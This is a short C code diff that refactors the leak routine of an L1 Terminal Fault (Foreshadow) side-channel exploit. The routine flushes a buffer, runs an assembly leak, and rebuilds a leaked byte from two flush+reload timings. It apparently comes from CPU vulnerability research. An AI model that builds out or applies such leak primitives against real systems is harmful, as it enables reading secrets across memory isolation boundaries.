@@ -34,14 +34,15 @@ uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
 }
 
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
-  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};
-
   flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
   asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
-  reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
-         THRESHOLD);
 
-  return reconstruct_nibbles(raw_results);
+  size_t first = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
+                        (void *)reload_buffer[0], THRESHOLD);
+  size_t second = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
+                         (void *)reload_buffer[1], THRESHOLD);
+
+  return ((second & 0x0f) << 4) | (first & 0x0f);
 }
 
 // Super fast checking of the existance of a byte at a certain address.
